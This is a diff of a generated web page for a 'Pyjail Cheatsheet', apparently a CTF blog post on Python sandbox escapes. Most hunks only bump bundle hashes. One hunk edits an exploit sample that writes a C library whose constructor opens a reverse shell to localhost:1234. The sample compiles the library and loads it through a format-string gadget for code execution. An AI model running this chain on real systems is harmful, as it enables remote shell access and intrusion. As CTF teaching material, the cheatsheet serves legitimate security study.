@@ -27,13 +27,13 @@
     <meta http-equiv="content-security-policy" content=""><title>Pyjail Cheatsheet</title><meta property="og:title" content="Pyjail Cheatsheet" data-svelte="svelte-15w3rt">
 	<link href="/_app/immutable/assets/__layout-58a37c92.css" rel="stylesheet">
 	<link href="/_app/immutable/assets/layout-5b9c754d.css" rel="stylesheet">
-	<link rel="modulepreload" href="/_app/immutable/start-1efbd4bc.js">
+	<link rel="modulepreload" href="/_app/immutable/start-2c19b67b.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/index-f2a82808.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/index-36b86faa.js">
 	<link rel="modulepreload" href="/_app/immutable/pages/__layout.svelte-e154bb9b.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/stores-1686c5b9.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/index-57d47233.js">
-	<link rel="modulepreload" href="/_app/immutable/pages/blog/pyjail-cheatsheet.md-d14a9d8a.js">
+	<link rel="modulepreload" href="/_app/immutable/pages/blog/pyjail-cheatsheet.md-cbf89867.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/layout-d6e193e1.js">
 	<link rel="modulepreload" href="/_app/immutable/chunks/utils-e126d158.js">
   </head>
@@ -372,7 +372,7 @@ user <span class="token operator">=</span> User<span class="token punctuation">(
 <span class="token comment"># - https://yun.ng/c/ctf/2025-uoft-ctf/web/prepared</span>
 
 <span class="token comment"># essentially, write .so / .dll file to system first and then load it as a c library for RCE</span>
-<span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/lib.c"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b'#include &lt;stdlib.h>&#92;n__attribute__((constructor))&#92;nvoid init() &#123;&#92;nsystem("python3 -c \\"import os; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'</span>localhost\<span class="token string">', 1234)); fd = s.fileno(); os.dup2(fd, 0); os.dup2(fd, 1); os.dup2(fd, 2); os.system(\'</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>sh\<span class="token string">')\\"");&#92;n&#125;'</span><span class="token punctuation">)</span>
+<span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/lib.c"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token triple-quoted-string string">b"""#include &lt;stdlib.h>&#92;n__attribute__((constructor))&#92;nvoid init() &#123;&#92;nsystem("python3 -c \"import os; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('localhost', 1234)); fd = s.fileno(); os.dup2(fd, 0); os.dup2(fd, 1); os.dup2(fd, 2); os.system('/bin/sh')\"");&#92;n&#125;"""</span><span class="token punctuation">)</span>
 os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"gcc -shared -fPIC /tmp/lib.c -o lib.so"</span><span class="token punctuation">)</span>
 
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;0.__init__.__globals__[__loader__].load_module.__globals__[sys].modules[ctypes].cdll[/tmp/lib.so]&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">)</span></code><!-- HTML_TAG_END --></pre>
@@ -1815,13 +1815,13 @@ inp <span class="token operator">=</span> <span class="token builtin">input</spa
 </footer>
 
 
-		<script type="module" data-sveltekit-hydrate="tc84lw">
-		import { set_public_env, start } from "/_app/immutable/start-1efbd4bc.js";
+		<script type="module" data-sveltekit-hydrate="oj443z">
+		import { set_public_env, start } from "/_app/immutable/start-2c19b67b.js";
 
 		set_public_env({});
 
 		start({
-			target: document.querySelector('[data-sveltekit-hydrate="tc84lw"]').parentNode,
+			target: document.querySelector('[data-sveltekit-hydrate="oj443z"]').parentNode,
 			paths: {"base":"","assets":""},
 			session: {},
 			route: true,
